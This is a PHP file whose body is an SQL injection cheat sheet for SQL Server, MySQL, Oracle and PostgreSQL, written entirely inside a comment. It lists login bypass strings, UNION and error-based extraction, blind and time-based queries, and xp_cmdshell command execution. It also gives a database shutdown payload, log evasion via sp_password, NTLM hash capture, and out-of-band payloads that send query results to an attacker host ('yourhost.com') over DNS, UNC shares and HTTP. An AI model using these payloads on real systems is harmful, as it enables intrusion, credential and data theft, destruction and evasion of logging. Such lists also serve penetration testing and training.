<?php

/*By passing Login Screens */
/*  SQL Injection 101, Login tricks

    admin' --
    admin' #
    admin'/*
    ' or 1=1--
    ' or 1=1#
    ' or 1=1/*
    ') or '1'='1--
    ') or ('1'='1--


/*******************************************************
Bypassing second MD5 hash check login screens
*******************************************************


If application is first getting the record by username and then compare returned MD5 with supplied password's MD5 then you need to some extra tricks to fool application to bypass authentication.
You can union results with a known password and MD5 hash of supplied password. 
In this case application will compare your password and your supplied MD5 hash instead of MD5 from database.

    Bypassing MD5 Hash Check Example (MSP)

Username :admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
Password : 1234

81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)



*******************************************************
Error Based - Find Columns Names
*******************************************************

Finding Column Names with HAVING BY - Error Based (S)
*******************************************************

In the same order,

' HAVING 1=1 --
' GROUP BY table.columnfromerror1 HAVING 1=1 --
' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 --
' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 -- and so on
If you are not getting any more error then it's done.
Finding how many columns in SELECT query by ORDER BY (MSO+)

Finding column number by ORDER BY can speed up the UNION SQL Injection process.

ORDER BY 1--
ORDER BY 2--
ORDER BY N-- so on
Keep going until get an error. Error means you found the number of selected columns.
Data types, UNION, etc.


*******************************************************
Hints,
*******************************************************


Always use UNION with ALL because of image similar non-distinct field types. By default union tries to get records with distinct.
To get rid of unrequired records from left table use -1 or any not exist record search in the beginning of query (if injection is in WHERE). This can be critical if you are only getting one result at a time.
Use NULL in UNION injections for most data type instead of trying to guess string, date, integer etc.
Be careful in Blind situtaions may you can understand error is coming from DB or application itself. Because languages like ASP.NET generally throws errors while trying to use NULL values (because normally developers are not expecting to see NULL in a username field)
Finding Column Type

*******************************************************

' union select sum(columntofind) from users-- (S) 
Microsoft OLE DB Provider for ODBC Drivers error '80040e07' 
[Microsoft][ODBC SQL Server Driver][SQL Server]The sum or average aggregate operation cannot take a varchar data type as an argument. 

If you are not getting an error it means column is numeric.
Also you can use CAST() or CONVERT()
SELECT * FROM Table1 WHERE id = -1 UNION ALL SELECT null, null, NULL, NULL, convert(image,1), null, null,NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULl, NULL--
11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE 1=2 –- 
No Error - Syntax is right. MS SQL Server Used. Proceeding.
11223344) UNION SELECT 1,NULL,NULL,NULL WHERE 1=2 –- 
No Error – First column is an integer.
11223344) UNION SELECT 1,2,NULL,NULL WHERE 1=2 -- 
Error! – Second column is not an integer.
11223344) UNION SELECT 1,'2',NULL,NULL WHERE 1=2 –- 
No Error – Second column is a string.
11223344) UNION SELECT 1,'2',3,NULL WHERE 1=2 –- 
Error! – Third column is not an integer. ... 

Microsoft OLE DB Provider for SQL Server error '80040e07' 
Explicit conversion from data type int to image is not allowed.
You'll get convert() errors before union target errors ! So start with convert() then union



*******************************************************
Simple Insert (MSO+)
*******************************************************

'; insert into users values( 1, 'hax0r', 'coolpass', 9 )/*

Useful Function / Information Gathering / Stored Procedures / Bulk SQL Injection Notes

@@version (MS) 
Version of database and more details for SQL Server. It's a constant. You can just select it like any other column, you don't need to supply table name. Also, you can use insert, update statements or in functions.

INSERT INTO members(id, user, pass) VALUES(1, ''+SUBSTRING(@@version,1,10) ,10)

Bulk Insert (S)

Insert a file content to a table. If you don't know internal path of web application you can read IIS (IIS 6 only) metabase file(%systemroot%\system32\inetsrv\MetaBase.xml) and then search in it to identify application path.

Create table foo( line varchar(8000) )
bulk insert foo from 'c:\inetpub\wwwroot\login.asp'
Drop temp table, and repeat for another file.
BCP (S)

Write text file. Login Credentials are required to use this function. 
bcp "SELECT * FROM test..foo" queryout c:\inetpub\wwwroot\runcommand.asp -c -Slocalhost -Usa -Pfoobar

VBS, WSH in SQL Server (S)

You can use VBS, WSH scripting in SQL Server because of ActiveX support.

declare @o int 
exec sp_oacreate 'wscript.shell', @o out 
exec sp_oamethod @o, 'run', NULL, 'notepad.exe' 
Username: '; declare @o int exec sp_oacreate 'wscript.shell', @o out exec sp_oamethod @o, 'run', NULL, 'notepad.exe' -- 

Executing system commands, xp_cmdshell (S)

Well known trick, By default it's disabled in SQL Server 2005. You need to have admin access.

EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:'

Simple ping check (configure your firewall or sniffer to identify request before launch it),

EXEC master.dbo.xp_cmdshell 'ping '

You can not read results directly from error or union or something else.

*******************************************************
Some Special Tables in SQL Server (S)
*******************************************************

Error Messages 
master..sysmessages
Linked Servers 
master..sysservers
Password (2000 and 20005 both can be crackable, they use very similar hashing algorithm ) 
SQL Server 2000: masters..sysxlogins 
SQL Server 2005 : sys.sql_logins 
More Stored Procedures for SQL Server (S)

Cmd Execute (xp_cmdshell) 
exec master..xp_cmdshell 'dir'
Registry Stuff (xp_regread) 
xp_regaddmultistring
xp_regdeletekey
xp_regdeletevalue
xp_regenumkeys
xp_regenumvalues
xp_regread
xp_regremovemultistring
xp_regwrite 
exec xp_regread HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet\Services\lanmanserver\parameters', 'nullsessionshares' 
exec xp_regenumvalues HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet\Services\snmp\parameters\validcommunities'
Managing Services (xp_servicecontrol)
Medias (xp_availablemedia)
ODBC Resources (xp_enumdsn)
Login mode (xp_loginconfig)
Creating Cab Files (xp_makecab)
Domain Enumeration (xp_ntsec_enumdomains)
Process Killing (need PID) (xp_terminate_process)
Add new procedure (virtually you can execute whatever you want) 
sp_addextendedproc 'xp_webserver', 'c:\temp\x.dll' 
exec xp_webserver
Write text file to a UNC or an internal path (sp_makewebtask)
MSSQL Bulk Notes

SELECT * FROM master..sysprocesses /*WHERE spid=@@SPID*/

/*
DECLARE @result int; EXEC @result = xp_cmdshell 'dir *.exe';IF (@result = 0) SELECT 0 ELSE SELECT 1/0

HOST_NAME() 
IS_MEMBER (Transact-SQL)  
IS_SRVROLEMEMBER (Transact-SQL)  
OPENDATASOURCE (Transact-SQL)

INSERT tbl EXEC master..xp_cmdshell OSQL /Q"DBCC SHOWCONTIG"
OPENROWSET (Transact-SQL)  - http://msdn2.microsoft.com/en-us/library/ms190312.aspx

You can not use sub selects in SQL Server Insert queries.

SQL Injection in LIMIT (M) or ORDER (MSO)

SELECT id, product FROM test.test t LIMIT 0,0 UNION ALL SELECT 1,'x'/*,10 ;
*/


/*
*******************************************************
If injection is in second limit you can comment it out or use in your union injection
*******************************************************

Shutdown SQL Server (S)

When you're really pissed off, ';shutdown --

Enabling xp_cmdshell in SQL Server 2005

By default xp_cmdshell and couple of other potentially dangerous stored procedures are disabled in SQL Server 2005. If you have admin access then you can enable these.

EXEC sp_configure 'show advanced options',1 
RECONFIGURE

EXEC sp_configure 'xp_cmdshell',1 
RECONFIGURE

Finding Database Structure in SQL Server (S)

Getting User defined Tables

SELECT name FROM sysobjects WHERE xtype = 'U'

Getting Column Names

SELECT name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'tablenameforcolumnnames')

Moving records (S)

Modify WHERE and use NOT IN or NOT EXIST, 
... WHERE users NOT IN ('First User', 'Second User') 
SELECT TOP 1 name FROM members WHERE NOT EXIST(SELECT TOP 0 name FROM members) -- very good one
Using Dirty Tricks 
SELECT * FROM Product WHERE ID=2 AND 1=CAST((Select p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE i.id<=o.id) AS x, name from sysobjects o) as p where p.x=3) as int 

Select p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE xtype='U' and i.id<=o.id) AS x, name from sysobjects o WHERE o.xtype = 'U') as p where p.x=21
 

Fast way to extract data from Error Based SQL Injections in SQL Server (S)

';BEGIN DECLARE @rt varchar(8000) SET @rd=':' SELECT @rd=@rd+' '+name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'MEMBERS') AND name>@rd SELECT @rd AS rd into TMP_SYS_TMP end;--

Detailed Article: Fast way to extract data from Error Based SQL Injections

Finding Database Structure in MySQL (M)

Getting User defined Tables

SELECT table_name FROM information_schema.tables WHERE table_schema = 'tablename'

Getting Column Names

SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'tablename'

Finding Database Structure in Oracle (O)

Getting User defined Tables

SELECT * FROM all_tables WHERE OWNER = 'DATABASE_NAME'

Getting Column Names

SELECT * FROM all_col_comments WHERE TABLE_NAME = 'TABLE'


*******************************************************
Blind SQL Injections
*******************************************************


About Blind SQL Injections __> 

In a quite good production application generally you can not see error responses on the page, so you can not extract data through Union attacks or error based attacks. You have to do use Blind SQL Injections attacks to extract data. There are two kind of Blind Sql Injections.

Normal Blind, You can not see a response in the page, but you can still determine result of a query from response or HTTP status code 
Totally Blind, You can not see any difference in the output in any kind. This can be an injection a logging function or similar. Not so common, though.

In normal blinds you can use if statements or abuse WHERE query in injection (generally easier), in totally blinds you need to use some waiting functions and analyze response times. For this you can use WAIT FOR DELAY '0:0:10' in SQL Server, BENCHMARK() and sleep(10) in MySQL, pg_sleep(10) in PostgreSQL, and some PL/SQL tricks in ORACLE.

Real and a bit Complex Blind SQL Injection Attack Sample

This output taken from a real private Blind SQL Injection tool while exploiting SQL Server back ended application and enumerating table names. This requests done for first char of the first table name. SQL queries a bit more complex then requirement because of automation reasons. In we are trying to determine an ascii value of a char via binary search algorithm.

TRUE and FALSE flags mark queries returned true or false.

TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>78-- 

FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>103-- 

TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) 
FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>89-- 

TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) 
FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>83-- 

TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) 
FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>80-- 

FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)

Since both of the last 2 queries failed we clearly know table name's first char's ascii value is 80 which means first char is `P`. This is the way to exploit Blind SQL injections by binary search algorithm. Other well-known way is reading data bit by bit. Both can be effective in different conditions.

 
*******************************************************
Making Databases Wait / Sleep For Blind SQL Injection Attacks
*******************************************************


First of all use this if it's really blind, otherwise just use 1/0 style errors to identify difference. Second, be careful while using times more than 20-30 seconds. database API connection or script can be timeout.

WAIT FOR DELAY 'time' (S)

This is just like sleep, wait for specified time. CPU safe way to make database wait.

WAITFOR DELAY '0:0:10'--

Also, you can use fractions like this,

WAITFOR DELAY '0:0:0.51'

Real World Samples

Are we 'sa' ? 
if (select user) = 'sa' waitfor delay '0:0:10'
ProductID = 1;waitfor delay '0:0:10'--
ProductID =1);waitfor delay '0:0:10'--
ProductID =1';waitfor delay '0:0:10'--
ProductID =1');waitfor delay '0:0:10'--
ProductID =1));waitfor delay '0:0:10'--
ProductID =1'));waitfor delay '0:0:10'--
BENCHMARK() (M)


*******************************************************
Basically, we are abusing this command to make MySQL wait a bit. Be careful you will consume web servers limit so fast!
*******************************************************

BENCHMARK(howmanytimes, do this)

Real World Samples

Are we root ? woot! 
IF EXISTS (SELECT * FROM users WHERE username = 'root') BENCHMARK(1000000000,MD5(1))
Check Table exist in MySQL 
IF (SELECT * FROM login) BENCHMARK(1000000,MD5(1))
pg_sleep(seconds) (P)

Sleep for supplied seconds.

SELECT pg_sleep(10); 
Sleep 10 seconds.
sleep(seconds) (M)

Sleep for supplied seconds.

SELECT sleep(10); 
Sleep 10 seconds.
dbms_pipe.receive_message (O)

Sleep for supplied seconds.

(SELECT CASE WHEN (NVL(ASCII(SUBSTR(({INJECTION}),1,1)),0) = 100) THEN dbms_pipe.receive_message(('xyz'),10) ELSE dbms_pipe.receive_message(('xyz'),1) END FROM dual)

{INJECTION} = You want to run the query.

If the condition is true, will response after 10 seconds. If is false, will be delayed for one second.

Covering Your Tracks

SQL Server -sp_password log bypass (S)

SQL Server don't log queries that includes sp_password for security reasons(!). So if you add --sp_password to your queries it will not be in SQL Server logs (of course still will be in web server logs, try to use POST if it's possible)


*******************************************************
Clear SQL Injection Tests
*******************************************************


These tests are simply good for blind sql injection and silent attacks.

product.asp?id=4 (SMO)
product.asp?id=5-1
product.asp?id=4 OR 1=1 

product.asp?name=Book
product.asp?name=Bo'%2b'ok
product.asp?name=Bo' || 'ok (OM)
product.asp?name=Book' OR 'x'='x
Extra MySQL Notes

Sub Queries are working only MySQL 4.1+
Users
SELECT User,Password FROM mysql.user;
SELECT 1,1 UNION SELECT IF(SUBSTRING(Password,1,1)='2',BENCHMARK(100000,SHA1(1)),0) User,Password FROM mysql.user WHERE User = 'root';
SELECT ... INTO DUMPFILE
Write query into a new file (can not modify existing files)
UDF Function
create function LockWorkStation returns integer soname 'user32';
select LockWorkStation(); 
create function ExitProcess returns integer soname 'kernel32';
select exitprocess();
SELECT USER();
SELECT password,USER() FROM mysql.user;
First byte of admin hash
SELECT SUBSTRING(user_password,1,1) FROM mb_users WHERE user_group = 1;
Read File
query.php?user=1+union+select+load_file(0x63...),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1
MySQL Load Data infile 
By default it's not available !
create table foo( line blob ); 
load data infile 'c:/boot.ini' into table foo; 
select * from foo;
More Timing in MySQL
select benchmark( 500000, sha1( 'test' ) );
query.php?user=1+union+select+benchmark(500000,sha1 (0x414141)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1
select if( user() like 'root@%', benchmark(100000,sha1('test')), 'false' ); 
Enumeration data, Guessed Brute Force
select if( (ascii(substring(user(),1,1)) >> 7) & 1, benchmark(100000,sha1('test')), 'false' );
Potentially Useful MySQL Functions

MD5() 
MD5 Hashing
SHA1() 
SHA1 Hashing
PASSWORD()
ENCODE()
COMPRESS() 
Compress data, can be great in large binary reading in Blind SQL Injections.
ROW_COUNT()
SCHEMA()
VERSION() 
Same as @@version
Second Order SQL Injections




*******************************************************
Basically, you put an SQL Injection to some place and expect it's unfiltered in another action. This is common hidden layer problem.
*******************************************************

Name : ' + (SELECT TOP 1 password FROM users ) + ' 
Email : xx@xx.com

If application is using name field in an unsafe stored procedure or function, process etc. then it will insert first users password as your name etc.

Forcing SQL Server to get NTLM Hashes

This attack can help you to get SQL Server user's Windows password of target server, but possibly you inbound connection will be firewalled. Can be very useful internal penetration tests. We force SQL Server to connect our Windows UNC Share and capture data NTLM session with a tool like Cain & Abel.

Bulk insert from a UNC Share (S) 
bulk insert foo from '\\YOURIPADDRESS\C$\x.txt'

Check out Bulk Insert Reference to understand how can you use bulk insert.

Out of Band Channel Attacks


*******************************************************
SQL Server
*******************************************************

?vulnerableParam=1; SELECT * FROM OPENROWSET('SQLOLEDB', ({INJECTION})+'.yourhost.com';'sa';'pwd', 'SELECT 1')
Makes DNS resolution request to {INJECT}.yourhost.com

?vulnerableParam=1; DECLARE @q varchar(1024); SET @q = '\\'+({INJECTION})+'.yourhost.com\\test.txt'; EXEC master..xp_dirtree @q
Makes DNS resolution request to {INJECTION}.yourhost.com

{INJECTION} = You want to run the query.
MySQL

?vulnerableParam=-99 OR (SELECT LOAD_FILE(concat('\\\\',({INJECTION}), 'yourhost.com\\'))) 
Makes a NBNS query request/DNS resolution request to yourhost.com

?vulnerableParam=-99 OR (SELECT ({INJECTION}) INTO OUTFILE '\\\\yourhost.com\\share\\output.txt')
Writes data to your shared folder/file

{INJECTION} = You want to run the query.


*******************************************************
Oracle
*******************************************************



?vulnerableParam=(SELECT UTL_HTTP.REQUEST('http://host/ sniff.php?sniff='||({INJECTION})||'') FROM DUAL)
Sniffer application will save results

?vulnerableParam=(SELECT UTL_HTTP.REQUEST('http://host/ '||({INJECTION})||'.html') FROM DUAL)
Results will be saved in HTTP access logs

?vulnerableParam=(SELECT UTL_INADDR.get_host_addr(({INJECTION})||'.yourhost.com') FROM DUAL)
You need to sniff dns resolution requests to yourhost.com

?vulnerableParam=(SELECT SYS.DBMS_LDAP.INIT(({INJECTION})||'.yourhost.com',80) FROM DUAL)
You need to sniff dns resolution requests to yourhost.com

{INJECTION} = You want to run the query.
















*/
?> 